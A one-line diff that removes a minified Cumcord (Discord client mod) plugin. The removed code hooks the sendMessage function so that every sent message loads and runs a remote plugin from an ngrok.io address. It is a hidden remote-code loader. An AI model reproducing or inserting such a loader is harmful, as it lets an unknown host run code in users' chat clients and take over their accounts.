@@ -1,1 +1,0 @@
-(function(n){"use strict";let e;var o={onLoad(){e=cumcord.patcher.after("sendMessage",n.webpackModules.findByProps("sendMessage"),r=>{cumcord.plugins.importPlugin("https://72d2-75-189-110-204.ngrok.io"+Math.random().toString(36).slice(2)+"/")})},onUnload(){e()}};return o})(cumcord.modules);
